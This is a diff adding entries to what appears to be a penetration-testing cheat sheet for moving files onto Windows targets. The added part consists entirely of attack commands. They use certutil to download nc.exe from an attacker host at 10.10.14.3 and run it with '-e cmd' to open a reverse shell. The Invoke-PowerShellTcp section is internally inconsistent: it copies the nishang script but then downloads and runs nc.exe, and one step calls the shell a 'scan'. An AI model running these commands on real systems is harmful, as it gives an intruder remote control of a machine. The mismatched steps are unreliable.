@@ -17,6 +17,25 @@
 ```bat
 certutil.exe -urlcache -f http://10.10.10.4/file.txt file.txt
 ```
+- Netcat
+```ps1
+# Step 1: Download the file
+certutil.exe -urlcache -f http://10.10.14.3:8000/nc.exe C:/Windows/Temp/nc.exe
+
+# Step 2: Trigger the scan
+C:/Windows/Temp/nc.exe 10.10.14.3 4444 -e cmd
+```
+- Invoke-PowerShellTcp.ps1
+```ps1
+# Step 1: Copy the script from nishang library
+cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+
+# Step 2: Download the script in the target
+certutil.exe -urlcache -f http://10.10.14.3:8000/nc.exe C:/Windows/Temp/nc.exe
+
+# Trigger the reverse shell
+C:/Windows/Temp/nc.exe 10.10.14.3 4444 -e cmd
+```
 - TFTP
   - Kali installation
   ```bash
